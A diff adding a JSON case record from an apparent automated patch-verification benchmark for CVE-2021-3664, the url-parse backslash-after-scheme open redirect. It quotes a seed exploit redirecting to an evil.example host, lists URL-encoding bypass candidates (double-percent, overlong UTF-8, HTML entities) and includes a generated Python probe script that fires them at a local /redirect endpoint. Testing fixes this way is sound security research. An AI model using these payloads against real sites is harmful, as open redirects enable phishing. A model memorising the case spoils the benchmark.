@@ -1,0 +1,610 @@
+{
+  "case_dir": "PCBV2-0009",
+  "a_paper_version": "1.0",
+  "k_limit": 8,
+  "n_limit": 4,
+  "status": "candidates_ready",
+  "P": {
+    "methods": [
+      "print",
+      "repr",
+      "candidate"
+    ],
+    "paths": [
+      "/redirect"
+    ],
+    "params": [
+      "probe_id",
+      "method",
+      "path",
+      "to"
+    ],
+    "dangerous_spans": [
+      "/redirect"
+    ],
+    "assert_literals": [],
+    "all_string_literals": [
+      "[GIVEN] CVE-2021-3664 seed exploit — url-parse backslash-after-scheme open redirect.\n\nurl-parse <= 1.5.1 (V0) mis-parses a URL whose scheme is followed by a single BACKSLASH (instead of\n`//`). For `https:\\<host>` its 1.5.1 `extractProtocol` (slashes regex `:[\\\\/]+`, sanitize replacing\nonly the FIRST backslash) produces `slashes=false` and folds the whole remainder into the pathname,\nso `parse('https:\\<host>').hostname === ''`. An app whose safe-redirect guard treats \"url-parse\nreports no host\" as \"same-origin, safe\" is therefore fooled: it approves the redirect and steers the\nbrowser to the RAW target, which every browser resolves as the absolute off-origin `https://<host>`.\n\nThis seed sets\n\n    to = https:\\<FLAG>.evil.example\n\nso a successful open redirect emits `Location: https:\\<FLAG>.evil.example` (header-safe: a real 302),\nand the flag/canary host surfaces in the Location header. The redirect-host label is the per-run\n${PCB_FLAG}; nothing is planted server-side.\n\nContract: reaches the flag on V0 (url-parse@1.5.1); BLOCKED on V1 (url-parse@1.5.2). The CVE-2021-3664\nfix (commit 81ab967, `isSpecial()` + slash/backslash rework, given in patch.diff) makes 1.5.2 parse\n`https:\\<host>` correctly -> hostname='<FLAG>.evil.example' -> off-origin -> guard rejects (403, no\nflag). This is the seed the system-under-test is given.\n",
+      "Request candidate: a /redirect whose `to` is scheme+single-backslash+attacker host.",
+      "probe_id",
+      "cve-2021-3664-backslash-after-scheme",
+      "method",
+      "GET",
+      "path",
+      "/redirect",
+      "to",
+      "https:\\\\{flag}.evil.example",
+      "__main__",
+      "PCBFLAG_demo"
+    ]
+  },
+  "O": {
+    "added_comparison_literals": [
+      {
+        "value": "file:",
+        "operator": "===",
+        "file": "index.js"
+      },
+      {
+        "value": "ftp:",
+        "operator": "===",
+        "file": "index.js"
+      },
+      {
+        "value": "http:",
+        "operator": "===",
+        "file": "index.js"
+      },
+      {
+        "value": "https:",
+        "operator": "===",
+        "file": "index.js"
+      },
+      {
+        "value": "ws:",
+        "operator": "===",
+        "file": "index.js"
+      },
+      {
+        "value": "wss:",
+        "operator": "===",
+        "file": "index.js"
+      },
+      {
+        "value": "2",
+        "operator": ">=",
+        "file": "index.js"
+      },
+      {
+        "value": "2",
+        "operator": "<",
+        "file": "index.js"
+      },
+      {
+        "value": "/",
+        "operator": "!==",
+        "file": "index.js"
+      },
+      {
+        "value": "file:",
+        "operator": "!==",
+        "file": "index.js"
+      },
+      {
+        "value": "what-is-up.com",
+        "operator": ".equals()",
+        "file": "test/test.js"
+      },
+      {
+        "value": "http://what-is-up.com/",
+        "operator": ".equals()",
+        "file": "test/test.js"
+      },
+      {
+        "value": "https://github.com/foo/bar",
+        "operator": ".equals()",
+        "file": "test/test.js"
+      },
+      {
+        "value": "github.com",
+        "operator": ".equals()",
+        "file": "test/test.js"
+      },
+      {
+        "value": "/foo/bar",
+        "operator": ".equals()",
+        "file": "test/test.js"
+      },
+      {
+        "value": "",
+        "operator": ".equals()",
+        "file": "test/test.js"
+      },
+      {
+        "value": "example.com",
+        "operator": ".equals()",
+        "file": "test/test.js"
+      },
+      {
+        "value": "foo:example.com",
+        "operator": ".equals()",
+        "file": "test/test.js"
+      },
+      {
+        "value": "/example.com",
+        "operator": ".equals()",
+        "file": "test/test.js"
+      },
+      {
+        "value": "foo:/example.com",
+        "operator": ".equals()",
+        "file": "test/test.js"
+      },
+      {
+        "value": "\\\\",
+        "operator": ".equals()",
+        "file": "test/test.js"
+      },
+      {
+        "value": "foo:",
+        "operator": ".equals()",
+        "file": "test/test.js"
+      },
+      {
+        "value": "foo://example.com",
+        "operator": ".equals()",
+        "file": "test/test.js"
+      },
+      {
+        "value": "foo:///example.com",
+        "operator": ".equals()",
+        "file": "test/test.js"
+      },
+      {
+        "value": "bar.com",
+        "operator": ".equals()",
+        "file": "test/test.js"
+      },
+      {
+        "value": "/",
+        "operator": ".equals()",
+        "file": "test/test.js"
+      },
+      {
+        "value": "foo://bar.com/",
+        "operator": ".equals()",
+        "file": "test/test.js"
+      },
+      {
+        "value": "/pathname",
+        "operator": ".equals()",
+        "file": "test/test.js"
+      },
+      {
+        "value": "null",
+        "operator": ".equals()",
+        "file": "test/test.js"
+      },
+      {
+        "value": "file:",
+        "operator": ".equals()",
+        "file": "test/test.js"
+      },
+      {
+        "value": "file:///",
+        "operator": ".equals()",
+        "file": "test/test.js"
+      },
+      {
+        "value": "//",
+        "operator": ".equals()",
+        "file": "test/test.js"
+      },
+      {
+        "value": "///",
+        "operator": ".equals()",
+        "file": "test/test.js"
+      },
+      {
+        "value": "/Users/foo/BAR/baz.pdf",
+        "operator": ".equals()",
+        "file": "test/test.js"
+      },
+      {
+        "value": "#hash",
+        "operator": ".equals()",
+        "file": "test/test.js"
+      },
+      {
+        "value": "?baz=qux",
+        "operator": ".equals()",
+        "file": "test/test.js"
+      },
+      {
+        "value": "/c:/foo/bar/",
+        "operator": ".equals()",
+        "file": "test/test.js"
+      },
+      {
+        "value": "file:///c:/foo/bar/",
+        "operator": ".equals()",
+        "file": "test/test.js"
+      },
+      {
+        "value": "file:///foo/bar",
+        "operator": ".equals()",
+        "file": "test/test.js"
+      },
+      {
+        "value": "/baz/foo/bar",
+        "operator": ".equals()",
+        "file": "test/test.js"
+      },
+      {
+        "value": "file:///baz/foo/bar",
+        "operator": ".equals()",
+        "file": "test/test.js"
+      }
+    ],
+    "removed_comparison_literals": [
+      {
+        "value": "2",
+        "operator": ">=",
+        "file": "index.js"
+      },
+      {
+        "value": "1",
+        "operator": "===",
+        "file": "index.js"
+      },
+      {
+        "value": "/",
+        "operator": "!==",
+        "file": "index.js"
+      },
+      {
+        "value": "file:",
+        "operator": "!==",
+        "file": "index.js"
+      }
+    ],
+    "new_calls": [
+      {
+        "name": "isSpecial",
+        "file": "index.js"
+      },
+      {
+        "name": "rest.slice",
+        "file": "index.js"
+      },
+      {
+        "name": "assume",
+        "file": "test/test.js"
+      },
+      {
+        "name": "equals",
+        "file": "test/test.js"
+      },
+      {
+        "name": "is.false",
+        "file": "test/test.js"
+      },
+      {
+        "name": "is.true",
+        "file": "test/test.js"
+      },
+      {
+        "name": "it",
+        "file": "test/test.js"
+      },
+      {
+        "name": "parse",
+        "file": "test/test.js"
+      }
+    ],
+    "changed_functions": [],
+    "new_string_constants": [
+      {
+        "value": "/",
+        "file": "index.js"
+      },
+      {
+        "value": "file:",
+        "file": "index.js"
+      },
+      {
+        "value": "ftp:",
+        "file": "index.js"
+      },
+      {
+        "value": "http:",
+        "file": "index.js"
+      },
+      {
+        "value": "https:",
+        "file": "index.js"
+      },
+      {
+        "value": "ws:",
+        "file": "index.js"
+      },
+      {
+        "value": "wss:",
+        "file": "index.js"
+      },
+      {
+        "value": "pathname",
+        "file": "index.js"
+      },
+      {
+        "value": "//",
+        "file": "index.js"
+      },
+      {
+        "value": "example.com",
+        "file": "test/test.js"
+      },
+      {
+        "value": "/foo",
+        "file": "test/test.js"
+      },
+      {
+        "value": "//foo/bar",
+        "file": "test/test.js"
+      },
+      {
+        "value": "foo",
+        "file": "test/test.js"
+      },
+      {
+        "value": "\\\\",
+        "file": "test/test.js"
+      },
+      {
+        "value": "http://google.com",
+        "file": "test/test.js"
+      },
+      {
+        "value": "what-is-up.com",
+        "file": "test/test.js"
+      },
+      {
+        "value": "http://what-is-up.com/",
+        "file": "test/test.js"
+      },
+      {
+        "value": "ignores slashes after the protocol for special URLs",
+        "file": "test/test.js"
+      },
+      {
+        "value": "https://github.com/foo/bar",
+        "file": "test/test.js"
+      },
+      {
+        "value": "https:/",
+        "file": "test/test.js"
+      },
+      {
+        "value": "https:/github.com/foo/bar",
+        "file": "test/test.js"
+      },
+      {
+        "value": "github.com",
+        "file": "test/test.js"
+      },
+      {
+        "value": "/foo/bar",
+        "file": "test/test.js"
+      },
+      {
+        "value": "https:",
+        "file": "test/test.js"
+      },
+      {
+        "value": "https:github.com/foo/bar",
+        "file": "test/test.js"
+      },
+      {
+        "value": "handles slashes after the protocol for non special URLs",
+        "file": "test/test.js"
+      },
+      {
+        "value": "foo:example.com",
+        "file": "test/test.js"
+      },
+      {
+        "value": "foo:/example.com",
+        "file": "test/test.js"
+      },
+      {
+        "value": "/example.com",
+        "file": "test/test.js"
+      },
+      {
+        "value": "foo:",
+        "file": "test/test.js"
+      },
+      {
+        "value": "foo://example.com",
+        "file": "test/test.js"
+      },
+      {
+        "value": "foo:///example.com",
+        "file": "test/test.js"
+      },
+      {
+        "value": "foo://bar.com",
+        "file": "test/test.js"
+      },
+      {
+        "value": "bar.com",
+        "file": "test/test.js"
+      },
+      {
+        "value": "/",
+        "file": "test/test.js"
+      },
+      {
+        "value": "foo://bar.com/",
+        "file": "test/test.js"
+      },
+      {
+        "value": "is null for non special URLs",
+        "file": "test/test.js"
+      },
+      {
+        "value": "foo://example.com/pathname",
+        "file": "test/test.js"
+      },
+      {
+        "value": "/pathname",
+        "file": "test/test.js"
+      },
+      {
+        "value": "null",
+        "file": "test/test.js"
+      },
+      {
+        "value": "handles the file: protocol",
+        "file": "test/test.js"
+      },
+      {
+        "value": "//",
+        "file": "test/test.js"
+      },
+      {
+        "value": "///",
+        "file": "test/test.js"
+      },
+      {
+        "value": "file:",
+        "file": "test/test.js"
+      },
+      {
+        "value": "file:///",
+        "file": "test/test.js"
+      },
+      {
+        "value": "file:////",
+        "file": "test/test.js"
+      },
+      {
+        "value": "file://///",
+        "file": "test/test.js"
+      },
+      {
+        "value": "file:///Users/foo/BAR/baz.pdf",
+        "file": "test/test.js"
+      },
+      {
+        "value": "/Users/foo/BAR/baz.pdf",
+        "file": "test/test.js"
+      },
+      {
+        "value": "file:///foo/bar?baz=qux#hash",
+        "file": "test/test.js"
+      },
+      {
+        "value": "#hash",
+        "file": "test/test.js"
+      },
+      {
+        "value": "?baz=qux",
+        "file": "test/test.js"
+      },
+      {
+        "value": "file://c:",
+        "file": "test/test.js"
+      },
+      {
+        "value": "/c:/foo/bar/",
+        "file": "test/test.js"
+      },
+      {
+        "value": "file:///c:/foo/bar/",
+        "file": "test/test.js"
+      },
+      {
+        "value": "foo/bar",
+        "file": "test/test.js"
+      },
+      {
+        "value": "file:///baz",
+        "file": "test/test.js"
+      },
+      {
+        "value": "file:///foo/bar",
+        "file": "test/test.js"
+      },
+      {
+        "value": "file:///baz/",
+        "file": "test/test.js"
+      },
+      {
+        "value": "/baz/foo/bar",
+        "file": "test/test.js"
+      },
+      {
+        "value": "file:///baz/foo/bar",
+        "file": "test/test.js"
+      }
+    ],
+    "new_regex_patterns": [
+      {
+        "pattern": "^[A-Za-z][A-Za-z0-9+-.]*:\\/\\/",
+        "file": "index.js"
+      },
+      {
+        "pattern": "^([a-z][a-z0-9.+-]*:)?(\\/\\/)?([\\\\/]+)?([\\S\\s]*)",
+        "file": "index.js"
+      },
+      {
+        "pattern": "\\\\",
+        "file": "index.js"
+      },
+      {
+        "pattern": "(.*)",
+        "file": "index.js"
+      }
+    ],
+    "files_touched": [
+      "index.js",
+      "test/browser.js",
+      "test/test.js"
+    ],
+    "is_empty": false
+  },
+  "D": {
+    "skipped": "no source_dir provided"
+  },
+  "a_paper_candidates": 1522,
+  "a_code_candidates": 59,
+  "siblings": [],
+  "sibling_count": 0,
+  "candidate_summary": {
+    "a_paper_count": 1522,
+    "a_code_count": 59,
+    "sibling_count": 0,
+    "total": 1581,
+    "a_paper_families": [
+      "double",
+      "slash",
+      "percent",
+      "ws",
+      "overlong",
+      "null",
+      "html",
+      "backslash",
+      "unicode",
+      "dot",
+      "case"
+    ],
+    "a_paper_version": "1.0"
+  },
+  "graph_connectivity": {
+    "entry_to_sink_connected": false,
+    "reason": "no tool graph"
+  },
+  "test_template": "\"\"\"Residual test: auto-generated by static pipeline.\n\nPath: /redirect\nMethod: GET\nO obligations: ['file:', 'ftp:', 'http:', 'https:', 'ws:', 'wss:', '2', '2', '/', 'file:']\nO removed: ['2', '1', '/', 'file:']\nN limit: 4\nA_paper version: 1.0\n\"\"\"\n\nimport os\nimport sys\nimport json\nimport urllib.request\nimport urllib.error\n\nBASE_URL = os.environ.get(\"BASE_URL\", \"http://localhost:8080\")\nMARKER = os.environ.get(\"MARKER\", \"\")\nMAX_ATTEMPTS = 4\n\n# Obligation set from AST diff\nO_ADDED = [\"file:\", \"ftp:\", \"http:\", \"https:\", \"ws:\", \"wss:\", \"2\", \"2\", \"/\", \"file:\", \"what-is-up.com\", \"http://what-is-up.com/\", \"https://github.com/foo/bar\", \"github.com\", \"/foo/bar\", \"example.com\", \"foo:example.com\", \"/example.com\", \"foo:/example.com\", \"\\\\\\\\\"]\nO_REMOVED = [\"2\", \"1\", \"/\", \"file:\"]\n\n# A_paper candidates (encoding families on dangerous spans)\nA_PAPER = [\n    \"%2F%72%65%64%69%72%65%63%74\",  # percent-full\n    \"%252F%2572%2565%2564%2569%2572%2565%2563%2574\",  # double-percent-full\n    \"&#47;&#114;&#101;&#100;&#105;&#114;&#101;&#99;&#116;\",  # html-numeric-full\n    \"%2Fredirect\",  # percent@0\n    \"%252Fredirect\",  # double-percent@0\n    \"%C0%AFredirect\",  # overlong-utf8-2@0\n    \"%E0%80%AFredirect\",  # overlong-utf8-3@0\n    \"\\\\u002Fredirect\",  # unicode-escape@0\n    \"&#47;redirect\",  # html-numeric@0\n    \"&#x2F;redirect\",  # html-hex@0\n    \"&sol;redirect\",  # html-named@0\n    \"\\\\/redirect\",  # backslash@0\n]\n\n# A_code candidates (source literals)\nA_CODE = [\n    \"file:\",  # O:added_cmp:index.js\n    \"ftp:\",  # O:added_cmp:index.js\n    \"http:\",  # O:added_cmp:index.js\n    \"https:\",  # O:added_cmp:index.js\n    \"ws:\",  # O:added_cmp:index.js\n    \"wss:\",  # O:added_cmp:index.js\n    \"2\",  # O:added_cmp:index.js\n    \"/\",  # O:added_cmp:index.js\n    \"what-is-up.com\",  # O:added_cmp:test/test.js\n    \"http://what-is-up.com/\",  # O:added_cmp:test/test.js\n    \"https://github.com/foo/bar\",  # O:added_cmp:test/test.js\n    \"github.com\",  # O:added_cmp:test/test.js\n]\n\nSIBLINGS = []\n\n\ndef probe(candidate_value: str) -> dict:\n    \"\"\"Send a black-box probe to V1 via GET /redirect.\"\"\"\n    url = BASE_URL.rstrip(\"/\") + candidate_value\n    req = urllib.request.Request(url, method=\"GET\")\n    req.add_header(\"User-Agent\", \"residual-test/1.0\")\n    try:\n        with urllib.request.urlopen(req, timeout=10) as resp:\n            body = resp.read().decode(\"utf-8\", errors=\"replace\")\n            headers = dict(resp.headers)\n            return {\"status\": resp.status, \"body\": body, \"headers\": headers}\n    except urllib.error.HTTPError as e:\n        body = e.read().decode(\"utf-8\", errors=\"replace\") if e.fp else \"\"\n        return {\"status\": e.code, \"body\": body, \"headers\": dict(e.headers)}\n    except Exception as e:\n        return {\"status\": \"error\", \"body\": str(e), \"headers\": {}}\n\n\ndef check_effect(response: dict) -> dict:\n    \"\"\"Check if the external effect marker appears in response.\"\"\"\n    body = response.get(\"body\", \"\")\n    headers = response.get(\"headers\", {})\n    \n    # Check body for marker\n    if MARKER and MARKER in body:\n        return {\"found\": True, \"location\": \"body\", \"marker\": MARKER}\n    \n    # Check headers for marker\n    for hname, hval in headers.items():\n        if MARKER and MARKER in str(hval):\n            return {\"found\": True, \"location\": f\"header:{hname}\", \"marker\": MARKER}\n    \n    return {\"found\": False}\n\n\ndef run():\n    \"\"\"Run candidates against V1, up to N attempts.\"\"\"\n    witnesses = []\n    attempts = 0\n    \n    all_candidates = []\n    for c in A_PAPER:\n        all_candidates.append((\"a_paper\", c))\n    for c in A_CODE:\n        all_candidates.append((\"a_code\", c))\n    for c in SIBLINGS:\n        all_candidates.append((\"sibling\", c))\n    \n    for source, candidate in all_candidates:\n        if attempts >= MAX_ATTEMPTS:\n            break\n        \n        attempts += 1\n        resp = probe(candidate)\n        effect = check_effect(resp)\n        \n        result = {\n            \"candidate\": candidate,\n            \"source\": source,\n            \"status\": resp[\"status\"],\n            \"effect\": effect,\n        }\n        \n        if effect.get(\"found\"):\n            # Check obligation binding\n            bound_o = None\n            for o_lit in O_ADDED + O_REMOVED:\n                if o_lit in candidate or any(o_lit in str(v) for v in [candidate]):\n                    bound_o = o_lit\n                    break\n            result[\"obligation_binding\"] = bound_o\n            result[\"verdict\"] = \"witness\" if bound_o else \"effect_only\"\n            witnesses.append(result)\n        else:\n            result[\"verdict\"] = \"no_effect\"\n    \n    return {\n        \"attempts\": attempts,\n        \"witnesses\": witnesses,\n        \"total_candidates\": len(all_candidates),\n    }\n\n\nif __name__ == \"__main__\":\n    if not MARKER:\n        print(\"Warning: MARKER not set\", file=sys.stderr)\n    result = run()\n    print(json.dumps(result, indent=2))\n",
+  "elapsed_s": 0.01
+}
